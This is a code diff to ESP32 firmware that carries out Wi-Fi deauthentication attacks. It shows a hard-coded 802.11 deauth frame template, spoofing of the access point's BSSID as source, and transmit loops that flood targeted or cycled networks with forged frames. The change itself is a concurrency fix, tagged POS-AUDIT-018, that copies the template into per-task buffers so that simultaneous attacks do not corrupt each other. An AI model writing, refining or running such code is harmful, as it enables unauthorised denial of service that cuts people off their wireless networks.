@@ -34,8 +34,12 @@ struct deauth_arg_t {
     uint16_t duration_ms;
 };
 
-/* Standard 802.11 deauth — reason 7 (class-3 frame from non-assoc STA). */
-static uint8_t s_frame[26] = {
+/* POS-AUDIT-018: standard 802.11 deauth template — reason 7 (class-3
+ * frame from non-assoc STA). Const template only; each task copies
+ * into its own stack-local frame[26] before mutating src/bssid, so
+ * back-to-back targeted+broadcast tasks can't trample each other's
+ * MAC fields mid-burst. */
+static const uint8_t s_frame_tmpl[26] = {
     0xC0, 0x00, 0x00, 0x00,
     0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,           /* dst = broadcast */
     0,0,0,0,0,0,                              /* src = AP */
@@ -75,8 +79,10 @@ static void deauth_targeted_task(void *arg)
              r->bssid[3], r->bssid[4], r->bssid[5], r->duration_ms);
 
     /* Build the spoofed-from-AP, broadcast-to-everyone frame. */
-    memcpy(s_frame + 10, r->bssid, 6);
-    memcpy(s_frame + 16, r->bssid, 6);
+    uint8_t frame[26];
+    memcpy(frame, s_frame_tmpl, sizeof(frame));
+    memcpy(frame + 10, r->bssid, 6);
+    memcpy(frame + 16, r->bssid, 6);
 
     esp_wifi_set_promiscuous(true);
     esp_wifi_set_channel(r->channel, WIFI_SECOND_CHAN_NONE);
@@ -86,7 +92,7 @@ static void deauth_targeted_task(void *arg)
     uint32_t last_status = 0;
 
     while (xTaskGetTickCount() < end) {
-        esp_wifi_80211_tx(WIFI_IF_STA, s_frame, sizeof(s_frame), false);
+        esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
         sent++;
         if (xTaskGetTickCount() - last_status > pdMS_TO_TICKS(250)) {
             send_status(r->requester, r->seq, sent, r->channel);
@@ -150,6 +156,9 @@ static void deauth_bcast_task(void *arg)
     esp_wifi_set_promiscuous(true);
     esp_wifi_set_channel(r->channel, WIFI_SECOND_CHAN_NONE);
 
+    uint8_t frame[26];
+    memcpy(frame, s_frame_tmpl, sizeof(frame));
+
     uint32_t end = xTaskGetTickCount() + pdMS_TO_TICKS(r->duration_ms);
     uint32_t sent = 0;
     uint32_t last_status = 0;
@@ -157,10 +166,10 @@ static void deauth_bcast_task(void *arg)
 
     while (xTaskGetTickCount() < end) {
         const struct ap_t *a = &s_aps[cur % s_ap_n];
-        memcpy(s_frame + 10, a->bssid, 6);
-        memcpy(s_frame + 16, a->bssid, 6);
+        memcpy(frame + 10, a->bssid, 6);
+        memcpy(frame + 16, a->bssid, 6);
         for (int i = 0; i < 16 && xTaskGetTickCount() < end; ++i) {
-            esp_wifi_80211_tx(WIFI_IF_STA, s_frame, sizeof(s_frame), false);
+            esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
             sent++;
             vTaskDelay(pdMS_TO_TICKS(3));
         }
